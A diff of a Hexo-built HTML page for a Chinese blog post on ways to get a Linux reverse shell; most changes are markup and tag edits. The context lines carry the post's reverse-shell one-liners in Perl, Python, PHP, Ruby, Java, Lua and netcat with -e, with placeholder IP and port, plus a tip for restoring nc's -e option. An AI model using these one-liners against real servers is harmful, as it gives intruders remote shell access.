@@ -1,20 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://www.lovebear.top">
   <title>Linux反弹shell的N种方法 | Blog for You</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="一、前言：Linux作服务器有很多的优点，所以很多服务都选择搭建在Linux服务器上，当我们发现服务器漏洞并对其进行漏洞利用的时候，比较理想的情况就是拿到网站的shell，这就需要用到Linux shell反弹，因为请求是从内部主动发起，所以防火墙过滤策略一般并不会十分严格（参考特洛伊木马，从内部攻击）。本文收集了一些Linux的反弹shell方法，并加上了一些自己的理解。">
+<meta name="keywords" content="Linux">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Linux反弹shell的N种方法">
 <meta property="og:url" content="http://www.lovebear.top/2018/09/16/Linux_shell/index.html">
 <meta property="og:site_name" content="Blog for You">
 <meta property="og:description" content="一、前言：Linux作服务器有很多的优点，所以很多服务都选择搭建在Linux服务器上，当我们发现服务器漏洞并对其进行漏洞利用的时候，比较理想的情况就是拿到网站的shell，这就需要用到Linux shell反弹，因为请求是从内部主动发起，所以防火墙过滤策略一般并不会十分严格（参考特洛伊木马，从内部攻击）。本文收集了一些Linux的反弹shell方法，并加上了一些自己的理解。">
-<meta property="og:updated_time" content="2018-09-17T02:27:02.927Z">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-09-17T02:27:02.928Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux反弹shell的N种方法">
 <meta name="twitter:description" content="一、前言：Linux作服务器有很多的优点，所以很多服务都选择搭建在Linux服务器上，当我们发现服务器漏洞并对其进行漏洞利用的时候，比较理想的情况就是拿到网站的shell，这就需要用到Linux shell反弹，因为请求是从内部主动发起，所以防火墙过滤策略一般并不会十分严格（参考特洛伊木马，从内部攻击）。本文收集了一些Linux的反弹shell方法，并加上了一些自己的理解。">
@@ -24,12 +26,12 @@
   
     <link rel="icon" href="/favicon.png">
   
-  <link rel="stylesheet" href="/main.css?v=4.0.0.css">
+  <link rel="stylesheet" href="/main.css?v=4.0.0">
   
 
   
 
-  <meta name="360-site-verification" content="a567763f2a0832b99ea6d0a57db81fbc" />
+  <meta name="360-site-verification" content="a567763f2a0832b99ea6d0a57db81fbc">
   <script>(function(){
 var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?1bc693950a04b443481f93da0209d936":"https://jspassport.ssl.qhimg.com/11.0.1.js?1bc693950a04b443481f93da0209d936";
 document.write('<script src="' + src + '" id="sozz"><\/script>');
@@ -52,7 +54,7 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 
   <script src="/js/jquery.js"></script>
 </head>
-
+</html>
 <body>
   <div id="container" q-class="show:isCtnShow">
     <canvas id="anm-canvas" class="anm-canvas"></canvas>
@@ -165,7 +167,7 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Linux_shell" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Linux_shell" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -194,14 +196,14 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 <blockquote>
 <p>&amp;   代表标准输出和标准错误输出都输出到空文件，即丢弃<br>0&gt;&amp;1 代表将标准输入定向到标准输出</p>
 </blockquote>
-<ol>
+<ol start="2">
 <li>perl版本：</li>
 </ol>
 <pre><code>perl -e &#39;use Socket;$i=&quot;#ip#&quot;;
 $p=#port#;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));
 if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);
 open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
-</code></pre><ol>
+</code></pre><ol start="3">
 <li>python版本：</li>
 </ol>
 <pre><code>python -c &#39;import socket,subprocess,os;
@@ -209,34 +211,34 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 s.connect((&quot;#ip#&quot;,#port#));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 
 os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
 </code></pre><p>套接字的文件描述符赋给标准输入，输出，错误输出。</p>
-<ol>
+<ol start="4">
 <li>php版本：</li>
 </ol>
 <pre><code>php -r &#39;$sock=fsockopen(&quot;#ip#&quot;,#port#);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
-</code></pre><ol>
+</code></pre><ol start="5">
 <li>ruby版本：</li>
 </ol>
 <pre><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;#ip#&quot;,#port#).to_i;
 exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
-</code></pre><ol>
+</code></pre><ol start="6">
 <li>java版本：</li>
 </ol>
 <pre><code>r = Runtime.getRuntime()
 p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/#ip#/#port#;
 cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
 p.waitFor()
-</code></pre><ol>
+</code></pre><ol start="7">
 <li>lua版本：</li>
 </ol>
 <pre><code>lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();
 t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;
-</code></pre><ol>
+</code></pre><ol start="8">
 <li>nc -e版本：</li>
 </ol>
 <pre><code>nc -e /bin/sh #ip# #port#
 </code></pre><p>nc的-c,-e选项被定义为危险选项，他们使用/bin/sh来执行nc<br>所以有的版本的nc不支持-c,-e选项（Linux发行的nc出于安全考虑，都不带-c,-e）<br>修复命令：</p>
 <pre><code>sudo rm /etc/alternatives/nc &amp;&amp; sudo ln -s /bin/nc.traditional /etc/alternatives/nc
-</code></pre><ol>
+</code></pre><ol start="9">
 <li>nc无-e版本：</li>
 </ol>
 <pre><code>mknod /tmp/backpipe p
@@ -429,14 +431,9 @@ t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3
 	}
 </script>
 
-<script src="/./main.js?v=4.0.0.js"></script>
+<script src="/./main.js?v=4.0.0"></script>
 
 
-
-<div id="totop" style="position:fixed;bottom:50px;right:30px;cursor: pointer;">
-<a title="totop"><img src="/img/scrollup.png"/></a>
-</div>
-<script src="/js/totop.js"></script>
     
 <div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
   <div class="tools-wrap">
@@ -479,6 +476,22 @@ t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ssl</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ubuntu</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">翻墙</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Vulnerability</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">hexo</a>
               </li>
              
@@ -489,29 +502,13 @@ t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)">pacman</a>
               </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">ssl</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">Vulnerability</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">ubuntu</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">翻墙</a>
-              </li>
             
             <div class="clearfix"></div>
           </ul>
         </div>
         <ul class="search-ul">
           <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
-            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            缺失模块。<br>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br> npm i hexo-generator-json-content --save<br><br>
             2、在根目录_config.yml里添加配置：
 <pre style="font-size: 12px;" q-show="jsonFail">
   jsonContent:
@@ -656,5 +653,5 @@ t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3
 
 </div>
   </div>
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":true}});</script></body>
 </html>
